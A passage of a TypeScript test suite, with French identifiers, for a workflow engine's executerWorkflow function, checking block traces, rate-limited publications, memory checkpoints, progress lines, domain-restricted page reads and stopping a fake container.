        { t: "fin", donnees: [] },
      ]),
    });
    const relayees: unknown[] = [];
    enChaine.infra.surTrace = (t) => relayees.push(t);
    const r = await executerWorkflow(enChaine.ctx, enChaine.infra);
    expect(r.execution.statut).toBe("reussie");
    expect(r.execution.blocs.find((x) => x.id === "fiche")!.journal).toEqual(["lu"]);
    expect(relayees).toEqual([
      { bloc: "liste", etape: "debut" },
      { bloc: "liste", etape: "fin", statut: "reussi", elements: 1 },
      { bloc: "fiche", etape: "debut" },
      { bloc: "avis", etape: "debut" },
      { bloc: "fiche", etape: "fin", statut: "reussi", elements: 1 },
      { bloc: "avis", etape: "fin", statut: "reussi", elements: 1 },
      { bloc: "sortie", etape: "debut" },
      { bloc: "sortie", etape: "fin", statut: "reussi", elements: 1 },
    ]);

    // End of avis before that of fiche: rejected; avis started without an end, the output (arriving too early) rejected.
    const desordre = await banc(veille({ auFilDeLEau: true }), {}, {
      lancer: lanceurPas([
        debutBloc("liste"), finBloc("liste"),
        debutBloc("fiche"), debutBloc("avis"),
        finBloc("avis"), finBloc("fiche"),
        debutBloc("sortie"),
        { t: "fin", donnees: [] },
      ]),
    });
    const relayees2: unknown[] = [];
    desordre.infra.surTrace = (t) => relayees2.push(t);
    const r2 = await executerWorkflow(desordre.ctx, desordre.infra);
    expect(r2.execution.blocs.map((x) => x.statut)).toEqual(["reussi", "reussi", "echoue", "pas-lance"]);
    expect(relayees2).not.toContainEqual(expect.objectContaining({ bloc: "avis", etape: "fin" }));

    // Without auFilDeLEau: two debut in a row, the second is rejected as today.
    const sans = await banc(veille(), {}, {
      lancer: lanceurPas([
        debutBloc("liste"), finBloc("liste"),
        debutBloc("fiche"), debutBloc("avis"),
        finBloc("fiche"), finBloc("avis"),
        { t: "fin", donnees: [] },
      ]),
    });
    const r3 = await executerWorkflow(sans.ctx, sans.infra);
    expect(r3.execution.blocs.map((x) => x.statut)).toEqual(["reussi", "reussi", "pas-lance", "pas-lance"]);

    // A trial has no chain: same rejection.
    const e = await banc(veille({ auFilDeLEau: true }), {}, {
      lancer: lanceurPas([
        debutBloc("liste"), finBloc("liste"),
        debutBloc("fiche"), debutBloc("avis"),
        finBloc("fiche"), finBloc("avis"),
        { t: "fin", donnees: [] },
      ]),
    });
    essai(e);
    const r4 = await executerWorkflow(e.ctx, e.infra);
    expect(r4.execution.blocs.map((x) => x.statut)).toEqual(["reussi", "reussi", "pas-lance", "pas-lance"]);
  });

  it("publication relayed only during the chain and 5 s apart; ignored before the chain, for a trial, without auFilDeLEau, beyond 2 MB", async () => {
    const gros = "x".repeat(2 * 1024 * 1024);
    const pas = (avancer: (ms: number) => () => void) => [
      debutBloc("liste"), finBloc("liste"),
      pub("avant la chaîne", 0, 3),
      debutBloc("fiche"),
      pub("entre deux debut", 0, 3),
      debutBloc("avis"),
      pub("A", 1, 3),
      avancer(3000), pub("trop tôt", 2, 3),
      avancer(1500), pub("C", 2, 3),
      avancer(5000), pub("faits > total", 4, 3),
      avancer(5000), pub(gros, 3, 3),
      avancer(5000), pub("D", 3, 3),
      finBloc("fiche"),
      avancer(5000), pub("après une fin", 3, 3),
      finBloc("avis"),
      avancer(5000), pub("après la chaîne", 3, 3),
      debutBloc("sortie"), finBloc("sortie"),
      { t: "fin", donnees: "finale" },
    ];
    const lancerAvec = async (workflow: unknown, regler: (b: Banc) => void = () => {}) => {
      const b = await banc(workflow);
      const avancer = horlogeFactice(b);
      b.infra.lancer = lanceurPas(pas(avancer));
      regler(b);
      const relayees: unknown[] = [];
      b.infra.surPublication = async (p) => {
        relayees.push(p);
      };
      const r = await executerWorkflow(b.ctx, b.infra);
      expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: "finale" } });
      return relayees;
    };

    expect(await lancerAvec(veille({ auFilDeLEau: true }))).toEqual([
      { donnees: "A", faits: 1, total: 3 },
      { donnees: "C", faits: 2, total: 3 },
      { donnees: "D", faits: 3, total: 3 },
    ]);
    expect(await lancerAvec(veille({ auFilDeLEau: true }), essai)).toEqual([]);
    expect(await lancerAvec(veille(), (b) => void (b.ctx.dureeMaxMinutes = 30))).toEqual([]);
  });

  it("a slow surPublication is finished before executerWorkflow returns", async () => {
    const b = await banc(veille({ auFilDeLEau: true }));
    const avancer = horlogeFactice(b);
    b.infra.lancer = lanceurPas([
      debutBloc("liste"), finBloc("liste"), debutBloc("fiche"), debutBloc("avis"),
      pub("A", 1, 2), avancer(5000), pub("B", 2, 2),
      finBloc("fiche"), finBloc("avis"), debutBloc("sortie"), finBloc("sortie"),
      { t: "fin", donnees: "finale" },
    ]);
    const finies: unknown[] = [];
    let enCours = 0;
    let auPlus = 0;
    b.infra.surPublication = async (p) => {
      enCours++;
      auPlus = Math.max(auPlus, enCours);
      await new Promise((ok) => setTimeout(ok, 80));
      finies.push(p.donnees);
      enCours--;
    };
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(finies).toEqual(["A", "B"]);
    expect(auPlus).toBe(1);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: "finale" } });
  });

  it("progressive: surMemoire at most every 30 s; an echec carries the last memory received; non-progressive: neither surMemoire nor memoire in the outcome", async () => {
    // The hash of the validated parameters (defaults included) of the liste block.
    const empreinte = paramsHash(valide(veille()).workflow.blocs.find((x) => x.id === "liste")!.parametres);
    const m = (n: number) => ({ t: "memoire", memoire: { liste: { type: "code", valeur: n }, inconnu: { type: "code", valeur: n } } });
    const marquee = (n: number) => ({ liste: { type: "code", valeur: n, empreinte } });
    const lancerAvec = async (d: number | undefined, fin: unknown = { t: "echec", erreur: "cassé" }) => {
      const b = await banc(veille());
      if (d !== undefined) b.ctx.dureeMaxMinutes = d;
      const avancer = horlogeFactice(b);
      b.infra.lancer = lanceurPas([m(1), avancer(10_000), m(2), avancer(25_000), m(3), m(4), fin]);
      const relayees: unknown[] = [];
      b.infra.surMemoire = async (x) => {
        relayees.push(x);
      };
      const r = await executerWorkflow(b.ctx, b.infra);
      return { r, relayees };
    };

    const prog = await lancerAvec(30);
    expect(prog.relayees).toEqual([marquee(1), marquee(3)]);
    expect(prog.r.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: marquee(4) });

    const sans = await lancerAvec(undefined);
    expect(sans.relayees).toEqual([]);
    expect(sans.r.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true });

    // A fin keeps the memory as today.
    const fin = await lancerAvec(30, { t: "fin", donnees: null });
    expect(fin.r.issue).toMatchObject({ t: "fin", memoire: marquee(4) });
  });

  it("progressive: a stop (timeout) carries the last memory received; a memory still held (nothing received after) does not count; non-progressive: none", async () => {
    // The hash of the validated parameters (defaults included) of the liste block.
    const empreinte = paramsHash(valide(veille()).workflow.blocs.find((x) => x.id === "liste")!.parametres);
    const lancerAvec = async (d: number | undefined) => {
      const b = await banc(veille(), {}, { delaiMs: 300 });
      if (d !== undefined) b.ctx.dureeMaxMinutes = d;
      b.infra.lancer = lanceurPas(
        [
          { t: "memoire", memoire: { liste: { type: "code", valeur: 7 } } },
          { t: "journal", bloc: "liste", texte: "suite" },
          // Held until the next line, which never arrives: it could precede a publication never read.
          { t: "memoire", memoire: { liste: { type: "code", valeur: 8 } } },
        ],
        { bloque: true },
      );
      return (await executerWorkflow(b.ctx, b.infra)).issue;
    };
    expect(await lancerAvec(30)).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé", memoire: { liste: { type: "code", valeur: 7, empreinte } } });
    expect(await lancerAvec(undefined)).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé" });
  });

  describe("the memory that precedes a publication follows its fate (R34)", () => {
    const empreinte = () => paramsHash(valide(veille()).workflow.blocs.find((x) => x.id === "liste")!.parametres);
    const mem = (n: number) => ({ t: "memoire", memoire: { liste: { type: "code", valeur: n } } });
    const marquee = (n: number) => ({ liste: { type: "code", valeur: n, empreinte: empreinte() } });
    const ouvrirChaine = [debutBloc("liste"), finBloc("liste"), debutBloc("fiche"), debutBloc("avis")];
    const lancerAvec = async (pas: (avancer: (ms: number) => () => void) => unknown[]) => {
      const b = await banc(veille({ auFilDeLEau: true }));
      const avancer = horlogeFactice(b);
      b.infra.lancer = lanceurPas(pas(avancer));
      const publiees: unknown[] = [];
      const memoires: unknown[] = [];
      b.infra.surPublication = async (p) => void publiees.push(p.donnees);
      b.infra.surMemoire = async (m) => void memoires.push(m);
      const r = await executerWorkflow(b.ctx, b.infra);
      return { issue: r.issue, publiees, memoires };
    };

    it("a publication over 2 MB followed by an echec: the outcome carries the earlier memory, even after other memories", async () => {
      const r = await lancerAvec((avancer) => [
        ...ouvrirChaine,
        mem(1), pub("A", 1, 3),
        avancer(5000), mem(2), pub("x".repeat(2 * 1024 * 1024 + 10), 2, 3),
        // Sent next by the container (verifierMemoire, before echec): it still retains the keys of the rejected publication.
        avancer(40_000), mem(3),
        { t: "echec", erreur: "cassé" },
      ]);
      expect(r.publiees).toEqual(["A"]);
      expect(r.memoires).toEqual([marquee(1)]);
      expect(r.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: marquee(1) });
    });

    it("a publication accepted after a rejected one puts the memory back on track", async () => {
      const r = await lancerAvec((avancer) => [
        ...ouvrirChaine,
        mem(1), pub("A", 1, 3),
        avancer(5000), mem(2), pub("faits > total", 4, 3),
        avancer(1000), mem(3), pub("B", 2, 3),
        mem(4),
        { t: "echec", erreur: "cassé" },
      ]);
      expect(r.publiees).toEqual(["A", "B"]);
      expect(r.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: marquee(4) });
    });

    it("two publications in the same stdout chunk: the second is rejected and its memory dropped", async () => {
      const ligne = (x: unknown) => JSON.stringify(x) + "\n";
      const r = await lancerAvec(() => [
        ...ouvrirChaine,
        ligne(mem(1)) + ligne(pub("A", 1, 3)) + ligne(mem(2)) + ligne(pub("B", 2, 3)) + ligne({ t: "echec", erreur: "cassé" }),
      ]);
      expect(r.publiees).toEqual(["A"]);
      expect(r.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: marquee(1) });
    });

    it("a fin keeps the last memory received, as before (the output shows everything)", async () => {
      const r = await lancerAvec((avancer) => [
        ...ouvrirChaine,
        mem(1), pub("A", 1, 3),
        avancer(1000), mem(2), pub("trop tôt", 2, 3),
        finBloc("fiche"), finBloc("avis"), debutBloc("sortie"), finBloc("sortie"),
        mem(3),
        { t: "fin", donnees: "finale" },
      ]);
      expect(r.issue).toMatchObject({ t: "fin", memoire: marquee(3) });
    });

    it("F1: a publication's data is written before the memory it makes safe", async () => {
      const b = await banc(veille({ auFilDeLEau: true }));
      b.infra.lancer = lanceurPas([...ouvrirChaine, mem(1), pub("A", 1, 3), { t: "echec", erreur: "cassé" }]);
      const ecrits: string[] = [];
      b.infra.surPublication = async (p) => {
        await new Promise((ok) => setTimeout(ok, 20));
        ecrits.push(`donnees ${p.donnees}`);
      };
      b.infra.surMemoire = async (m) => void ecrits.push(`memoire ${m.liste?.valeur}`);
      const r = await executerWorkflow(b.ctx, b.infra);
      expect(ecrits).toEqual(["donnees A", "memoire 1"]);
      expect(r.issue).toMatchObject({ memoire: marquee(1) });
    });

    it("F1: a refused data write leaves the memory doubtful until the next written publication", async () => {
      const lancer = async (pas: unknown[]) => {
        const b = await banc(veille({ auFilDeLEau: true }));
        const avancer = horlogeFactice(b);
        b.infra.lancer = lanceurPas(pas.map((p) => (p === "avancer" ? avancer(5000) : p)));
        const memoires: unknown[] = [];
        b.infra.surPublication = async (p) => {
          if (p.donnees === "refusee") throw new Error("disque plein");
        };
        b.infra.surMemoire = async (m) => void memoires.push(m);
        const r = await executerWorkflow(b.ctx, b.infra);
        return { issue: r.issue, memoires };
      };
      const refusee = await lancer([...ouvrirChaine, mem(1), pub("refusee", 1, 3), mem(2), { t: "journal", bloc: "fiche", texte: "x" }, { t: "echec", erreur: "cassé" }]);
      expect(refusee.memoires).toEqual([]);
      expect(refusee.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: null });
      const reprise = await lancer([...ouvrirChaine, mem(1), pub("refusee", 1, 3), "avancer", mem(2), pub("B", 2, 3), mem(3), { t: "echec", erreur: "cassé" }]);
      expect(reprise.memoires).toEqual([marquee(2)]);
      expect(reprise.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: marquee(3) });
    });

    it("a memory after the output block's end, then fin: neither relayed nor safe, it only serves the fin outcome", async () => {
      const r = await lancerAvec((avancer) => [
        ...ouvrirChaine,
        mem(1), pub("A", 1, 3),
        avancer(40_000),
        finBloc("fiche"), finBloc("avis"), debutBloc("sortie"), finBloc("sortie"),
        mem(2),
        { t: "fin", donnees: "finale" },
      ]);
      expect(r.memoires).toEqual([marquee(1)]);
      expect(r.issue).toMatchObject({ t: "fin", memoire: marquee(2) });
    });

    it("a memory followed by fin is not relayed, even without an output end trace", async () => {
      const r = await lancerAvec((avancer) => [
        ...ouvrirChaine,
        mem(1), pub("A", 1, 3),
        avancer(40_000), mem(2),
        { t: "fin", donnees: "finale" },
      ]);
      expect(r.memoires).toEqual([marquee(1)]);
      expect(r.issue).toMatchObject({ t: "fin", memoire: marquee(2) });
    });

    it("a memory after the output block's end, then echec: the outcome keeps the earlier safe memory", async () => {
      const r = await lancerAvec((avancer) => [
        ...ouvrirChaine,
        mem(1), pub("A", 1, 3),
        avancer(40_000),
        finBloc("fiche"), finBloc("avis"), debutBloc("sortie"), finBloc("sortie"),
        mem(2), { t: "journal", bloc: "sortie", texte: "après" },
        { t: "echec", erreur: "cassé" },
      ]);
      expect(r.memoires).toEqual([marquee(1)]);
      expect(r.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: marquee(1) });
    });
  });

  it("interpreteur.mjs's TAILLE_MAX_DONNEES equals the kernel's, re-exported by accueil", async () => {
    const interpreteur = await import(pathToFileURL(join(MOTEUR, "interpreteur.mjs")).href);
    expect(interpreteur.TAILLE_MAX_DONNEES).toBe(DATA_MAX_SIZE);
    expect(TAILLE_MAX_DONNEES_ACCUEIL).toBe(DATA_MAX_SIZE);
    expect(DATA_MAX_SIZE).toBe(2 * 1024 * 1024);
  });

  it("executer.ts's ECART_PUBLICATIONS_MS and ECART_MEMOIRE_MS equal those of interpreteur.mjs", async () => {
    const interpreteur = await import(pathToFileURL(join(MOTEUR, "interpreteur.mjs")).href);
    expect(PUBLICATIONS_GAP_MS).toBe(5000);
    expect(MEMORY_GAP_MS).toBe(30_000);
    expect(interpreteur.ECART_PUBLICATIONS_MS).toBe(PUBLICATIONS_GAP_MS);
    expect(interpreteur.ECART_MEMOIRE_MS).toBe(MEMORY_GAP_MS);
  });
});

describe("executerWorkflow: input, progress, reads and stop (actions)", () => {
  /** A fake container: writes its lines, then waits to be killed (`bloque`) or exits with 0. `recu`: what it receives. */
  const lanceurLignes = (lignes: unknown[], o: { recu?: string[]; bloque?: boolean; tue?: () => void } = {}): ProcessLauncher => () => {
    const stdout = new PassThrough();
    const stderr = new PassThrough();
    const stdin = new PassThrough();
    stdin.on("data", (d: Buffer) => o.recu?.push(d.toString()));
    let tuer = () => {};
    const fin = new Promise<number | null>((ok) => {
      tuer = () => {
        o.tue?.();
        stdout.end();
        stderr.end();
        ok(null);
      };
      setImmediate(() => {
        for (const l of lignes) stdout.write(JSON.stringify(l) + "\n");
        if (o.bloque) return;
        stdout.end();
        stderr.end();
        setImmediate(() => ok(0));
      });
    });
    return { stdin, stdout, stderr, tuer: () => tuer(), fin };
  };

  it("a widget's debut line is identical to before (snapshot)", async () => {
    const recu: string[] = [];
    const b = await banc(chaine("a"), {}, { lancer: lanceurLignes([{ t: "fin", donnees: null }], { recu }) });
    await executerWorkflow(b.ctx, b.infra);
    const workflow = JSON.stringify({ blocs: b.ctx.valide.workflow.blocs, liens: b.ctx.valide.workflow.liens, ordre: ["a", "sortie"] });
    expect(recu.join("").split("\n")[0]).toBe(
      `{"t":"debut","precedent":null,"maintenant":"2026-10-29T10:00:00.000Z","config":{"interets":"rust"},"workflow":${workflow}}`,
    );
  });

  it("an action sends saisie and avancement in debut", async () => {
    const recu: string[] = [];
    const proprietaires: unknown[] = [];
    const b = await banc(chaine("a"), {}, { lancer: lanceurLignes([{ t: "fin", donnees: [] }], { recu }) });
    b.ctx.proprietaire = { type: "action", id: "leboncoin" };
    b.ctx.saisie = "clio lyon";
    b.ctx.avancement = true;
    b.infra.atelier.commandeRecolte = (p, d, m) => (proprietaires.push(p), ["docker", "run", nomDe(p), d, m]);
    const r = await executerWorkflow(b.ctx, b.infra);
    const debut = JSON.parse(recu.join("").split("\n")[0]!);
    expect(debut).toMatchObject({ t: "debut", saisie: "clio lyon", avancement: true });
    expect(r.execution).toMatchObject({ proprietaire: { type: "action", id: "leboncoin" }, saisie: "clio lyon" });
    // The workshop receives the whole owner: an action's container has its own name.
    expect(proprietaires).toEqual([{ type: "action", id: "leboncoin" }]);
  });

  it("a lirePage of https://gitlab.com/x emits lecture « gitlab.com » on the current block", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [{ url: "https://gitlab.com/x", titre: "X", texte: "", liens: [] }] } });
    const b = await banc(
      chaine("a", "b"),
      {
        "a.mjs": `export default async () => 1;`,
        "b.mjs": `export default async (e, w) => (await w.lirePage("https://gitlab.com/x")).titre;`,
      },
      { pont },
    );
    b.ctx.proprietaire = { type: "action", id: "gitlab" };
    const relayees: DirectTrace[] = [];
    b.infra.surTrace = (t) => relayees.push(t);
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: "X" } });
    expect(relayees).toEqual([
      { bloc: "a", etape: "debut" },
      { bloc: "a", etape: "fin", statut: "reussi", elements: null },
      { bloc: "b", etape: "debut" },
      { bloc: "b", etape: "lecture", hote: "gitlab.com" },
      { bloc: "b", etape: "fin", statut: "reussi", elements: null },
      { bloc: "sortie", etape: "debut" },
      { bloc: "sortie", etape: "fin", statut: "reussi", elements: null },
    ]);
  });

  it("a refused read (undeclared domain) emits no lecture", async () => {
    const b = await banc(chaine("a"), { "a.mjs": `export default async (e, w) => { try { await w.lirePage("https://tiers.example/"); } catch { return "refusée"; } };` }, { compte: ["gitlab.com"], publiques: [] });
    const relayees: DirectTrace[] = [];
    b.infra.surTrace = (t) => relayees.push(t);
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: "refusée" } });
    expect(relayees.some((t) => t.etape === "lecture")).toBe(false);
  });

  it("signal raised: container killed, status interrompue, error ACTION_ARRETEE, erreurNoyau", async () => {
    let tue = 0;
    const arret = new AbortController();
    const b = await banc(chaine("a"), {}, { lancer: lanceurLignes([{ t: "bloc", id: "a", etape: "debut" }], { bloque: true, tue: () => tue++ }) });
    b.ctx.proprietaire = { type: "action", id: "gitlab" };
    b.ctx.signal = arret.signal;
    b.infra.surTrace = (t) => {
      if (t.etape === "debut") setImmediate(() => arret.abort());
    };
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(tue).toBe(1);
    expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: ACTION_STOPPED });
    expect(r.execution).toMatchObject({ statut: "interrompue", erreur: ACTION_STOPPED, erreurNoyau: true });
    expect(r.execution.blocs[0]!.statut).toBe("interrompu");
    expect(b.supprimes).toEqual(["action:gitlab", "action:gitlab"]);
  });

  it("an already-raised signal: nothing is launched, run interrupted", async () => {
    const arret = new AbortController();
    arret.abort();
    const b = await banc(chaine("a"));
    b.ctx.signal = arret.signal;
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(b.commandes).toEqual([]);
    expect(r.execution).toMatchObject({ statut: "interrompue", erreur: ACTION_STOPPED, erreurNoyau: true });
  });

  it("an avancement line with faits > total is rejected", async () => {
    const b = await banc(chaine("a"), {}, {
      lancer: lanceurLignes([
        { t: "bloc", id: "a", etape: "debut" },
        { t: "bloc", id: "a", etape: "avancement", faits: 3, total: 2 },
        { t: "bloc", id: "a", etape: "avancement", faits: -1, total: 2 },
        { t: "bloc", id: "sortie", etape: "avancement", faits: 1, total: 2 },
        { t: "bloc", id: "a", etape: "avancement", faits: 2, total: 2 },
        { t: "bloc", id: "a", etape: "fin", statut: "reussi", sortie: [1, 2] },
        { t: "bloc", id: "a", etape: "avancement", faits: 2, total: 2 },
        { t: "bloc", id: "sortie", etape: "debut" },
        { t: "bloc", id: "sortie", etape: "fin", statut: "reussi", sortie: [1, 2] },
        { t: "fin", donnees: [1, 2] },
      ]),
    });
    b.ctx.avancement = true;
    const relayees: DirectTrace[] = [];
    b.infra.surTrace = (t) => relayees.push(t);
    await executerWorkflow(b.ctx, b.infra);
    // Only that of the current block, with faits ≤ total, passes; an avancement outside its block is ignored.
    expect(relayees.filter((t) => t.etape === "avancement")).toEqual([{ bloc: "a", etape: "avancement", faits: 2, total: 2 }]);
  });

  it("avancement: at most one per ECART_AVANCEMENT_MS and per block, the last (faits = total) always; ignored without avancement", async () => {
    let t = 0;
    const lignes = [
      { t: "bloc", id: "a", etape: "debut" },
      ...[1, 2, 3, 4].map((faits) => ({ t: "bloc", id: "a", etape: "avancement", faits, total: 4 })),
      { t: "bloc", id: "a", etape: "fin", statut: "reussi", sortie: [] },
      { t: "bloc", id: "sortie", etape: "debut" },
      { t: "bloc", id: "sortie", etape: "fin", statut: "reussi", sortie: [] },
      { t: "fin", donnees: [] },
    ];
    const avec = await banc(chaine("a"), {}, { lancer: lanceurLignes(lignes) });
    avec.ctx.avancement = true;
    // 300 ms between two received lines.
    avec.infra.horloge = () => new Date(MAINTENANT.getTime() + (t += 300));
    const relayees: DirectTrace[] = [];
    avec.infra.surTrace = (x) => relayees.push(x);
    await executerWorkflow(avec.ctx, avec.infra);
    const faits = relayees.flatMap((x) => (x.etape === "avancement" ? [x.faits] : []));
    expect(faits[0]).toBe(1);
    expect(faits.at(-1)).toBe(4);
    expect(faits.length).toBeLessThan(4);

    const sans = await banc(chaine("a"), {}, { lancer: lanceurLignes(lignes) });
    const relayees2: DirectTrace[] = [];
    sans.infra.surTrace = (x) => relayees2.push(x);
    await executerWorkflow(sans.ctx, sans.infra);
    expect(relayees2.some((x) => x.etape === "avancement")).toBe(false);
  });
});
